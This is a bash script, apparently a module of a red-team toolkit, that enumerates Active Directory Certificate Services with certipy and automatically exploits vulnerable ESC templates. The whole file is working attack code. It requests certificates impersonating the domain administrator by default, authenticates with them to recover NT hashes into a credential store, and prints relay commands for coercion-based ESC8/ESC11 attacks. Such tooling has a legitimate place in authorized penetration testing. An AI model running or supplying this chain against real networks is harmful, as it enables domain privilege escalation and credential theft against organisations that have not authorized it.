#!/usr/bin/env bash
# =============================================================================
#  adcs_abuse.sh  —  AD CS enumeration + dynamic ESC abuse via certipy  (ATOMIC)
# =============================================================================
#  Attack-chain role: if the environment runs Active Directory Certificate
#  Services, a vulnerable template often means instant domain escalation. This
#  enumerates vulnerable templates, DETECTS which ESC class(es) actually apply,
#  then attempts each in turn — no need to know the ESC up front.
#
#  Flow:  certipy find -vulnerable  →  detect template/ESC pairs  →  per class:
#    * request-based (ESC1/2/3/6/9/10/13/16): certipy req → certipy auth →
#      recover a TGT + NT hash (stored in creds.json)
#    * relay-based (ESC8/ESC11): reported with the relay command to run (these
#      need coercion + a relay, not a direct request)
#
#  Extra flags:
#    --esc <N>          force a specific ESC class, bypassing auto-detection
#    --ca <name>        force the Certificate Authority (manual override)
#    --template <name>  force the template (manual override)
#    --upn <user>       identity to impersonate (default administrator@<domain>)
#    --find-only        just enumerate; don't exploit
#
#  Run with no flags to auto-detect and exploit; add --find-only to inspect the
#  `find` output first, or force one class with --esc/--ca/--template.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
adcs_abuse.sh — AD CS enumeration + dynamic ESC abuse via certipy (ATOMIC)

USAGE:   ./adcs_abuse.sh [--find-only] [--esc N] [--ca CA --template TPL] [--upn user] [-t dc] [-d domain]
EXAMPLE: ./adcs_abuse.sh                        # auto-detect vulnerable ESC(s) and exploit
         ./adcs_abuse.sh --find-only            # just enumerate
         ./adcs_abuse.sh --esc 1 --ca CORP-CA --template VulnTemplate   # force one

FLAGS:
  --find-only        only enumerate vulnerable templates; don't exploit
  --esc <N>          force a specific ESC class (bypass auto-detection), e.g. --esc 1
  --ca <name>        force the Certificate Authority (manual override)
  --template <name>  force the template (manual override)
  --upn <user>       identity to impersonate (default administrator@<domain>)
  -h, --help         this help
  (shared flags -t/-d/--dc-ip: --help-common)

WHAT IT DOES: runs `certipy find -vulnerable` first, detects which ESC class(es)
  actually apply, then attempts each in turn. Request-based classes (ESC1/2/3/9/
  10/13/16) are exploited via `certipy req`+`auth` to recover a TGT + NT hash
  (stored in creds.json); relay-based classes (ESC8/ESC11) are reported with the
  command to run (they need coercion + a relay, not a direct request). A manual
  --esc/--ca/--template override skips detection. Artifacts land in the loot dir.
PREREQS: a credential in creds.json; AD CS present; certipy.
EOF
}

CA="" TEMPLATE="" UPN="" FIND_ONLY=0 ESC_FORCE=""

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    --ca) CA="$2"; shift 2 ;;
    --template) TEMPLATE="$2"; shift 2 ;;
    --upn) UPN="$2"; shift 2 ;;
    --esc) ESC_FORCE="${2#ESC}"; ESC_FORCE="${ESC_FORCE#esc}"; shift 2 ;;
    --find-only) FIND_ONLY=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <dc>"
require_creds "$DOMAIN_OVERRIDE"
DOMAIN="$(resolve_domain)"
UPN="${UPN:-administrator@${DOMAIN}}"
need_cmd certipy

log_begin
announce_loot
CAUTH="$(certipy_auth)"
LOOT="$(loot_dir)"

# --- attempt one request-based ESC: req a cert then auth with it -------------
# Covers ESC1/2/3/6/9/10/13/16, which all reduce to "request a cert for a
# privileged identity, then authenticate as it". Exotic cases may need extra
# certipy flags — force them with --esc/--ca/--template if auto-attempt fails.
exploit_req_esc() {                 # exploit_req_esc <esc> <ca> <template>
  local esc="$1" ca="$2" tpl="$3" nt acct
  log_info "attempting ESC${esc} via CA='${ca}' template='${tpl}' (impersonate ${UPN})"
  run_cmd "cd '${LOOT}' && certipy req ${CAUTH} -ca $(printf '%q' "$ca") -template $(printf '%q' "$tpl") -upn $(printf '%q' "$UPN")"
  local pfx; pfx="$(ls -t "${LOOT}"/*.pfx 2>/dev/null | head -n1)"
  if [[ -z "$pfx" ]]; then
    log_warn "ESC${esc}: no .pfx produced (req failed for this class/template)"
    return 1
  fi
  local auth_cmd="cd '${LOOT}' && certipy auth -pfx $(printf '%q' "$pfx") -dc-ip ${DC}"
  log_run "$auth_cmd"; exec_capture "$auth_cmd"
  nt="$(printf '%s' "$LAST_OUTPUT" | grep -oiE '[a-f0-9]{32}:[a-f0-9]{32}' | tail -n1 | cut -d: -f2)"
  acct="$(echo "$UPN" | cut -d@ -f1)"
  if [[ -n "$nt" ]]; then
    creds_add "$DOMAIN" "$acct" "ntlm_hash" "$nt" "AD CS ESC${esc} (${tpl}), $(date '+%F')"
    log_ok "ESC${esc}: recovered NT hash for ${acct}"
  else
    log_warn "ESC${esc}: cert obtained but no NT hash parsed (a TGT .ccache may be in ${LOOT})"
  fi
  log_output                        # NT hash now tracked → redacted
  return 0
}

# 1) Enumerate. Capture to parse; certipy also drops its json/txt into the loot dir.
FIND_CMD="cd '${LOOT}' && certipy find ${CAUTH} -vulnerable -stdout"
log_run "$FIND_CMD"; exec_capture "$FIND_CMD"; log_output
FIND_OUT="$LAST_OUTPUT"

if [[ "$FIND_ONLY" -eq 1 ]]; then
  log_info "find-only: review the output above / in ${LOOT}, then re-run to exploit"
  log_end "success"; exit 0
fi

# 2) Manual override: a forced ESC (and CA/template) skips auto-detection.
if [[ -n "$ESC_FORCE" ]]; then
  [[ -n "$CA" && -n "$TEMPLATE" ]] || die "--esc requires --ca and --template as well"
  case "$ESC_FORCE" in
    8|11) log_warn "ESC${ESC_FORCE} is relay-based — run: certipy relay -target 'http://<ca-host>' (needs coercion, see delegation_abuse.sh)"; log_end "partial"; exit 0 ;;
    *) exploit_req_esc "$ESC_FORCE" "$CA" "$TEMPLATE"; log_end "success"; exit 0 ;;
  esac
fi

# 3) Auto-detect: pair each vulnerable template with the ESC class(es) found on it.
CA_DETECTED="$(printf '%s' "$FIND_OUT" | grep -iE 'CA Name' | head -n1 | sed 's/.*: *//' | tr -d '\r')"
[[ -n "$CA" ]] && CA_DETECTED="$CA"      # honor an explicit --ca during auto-detect

# awk emits "template<TAB>ESCn" for every ESC line, tracking the current template.
mapfile -t PAIRS < <(printf '%s\n' "$FIND_OUT" | awk '
  /Template Name/ { t=$0; sub(/.*: */,"",t); gsub(/\r/,"",t) }
  /^[[:space:]]*ESC[0-9]+/ { e=$1; gsub(/[^A-Za-z0-9]/,"",e); print t"\t"e }
' | sort -u)

if [[ "${#PAIRS[@]}" -eq 0 ]]; then
  log_warn "no vulnerable ESC templates detected by certipy — nothing to exploit (try --find-only to inspect, or force with --esc/--ca/--template)"
  log_end "partial"; exit 0
fi

log_info "detected ${#PAIRS[@]} vulnerable template/ESC pair(s); handling each in turn"
any=0
for pair in "${PAIRS[@]}"; do
  tpl="${pair%%$'\t'*}"; esc="${pair##*$'\t'}"; escn="${esc#ESC}"
  case "$escn" in
    8|11)
      log_warn "ESC${escn} on '${tpl}' is relay-based — not auto-run. Use: certipy relay -target 'http://${CA_DETECTED:-<ca-host>}' with coercion (see delegation_abuse.sh / PetitPotam)."
      ;;
    *)
      exploit_req_esc "$escn" "${CA_DETECTED:-$CA}" "$tpl" && any=1
      ;;
  esac
done

[[ "$any" -eq 1 ]] && log_end "success" || log_end "partial"
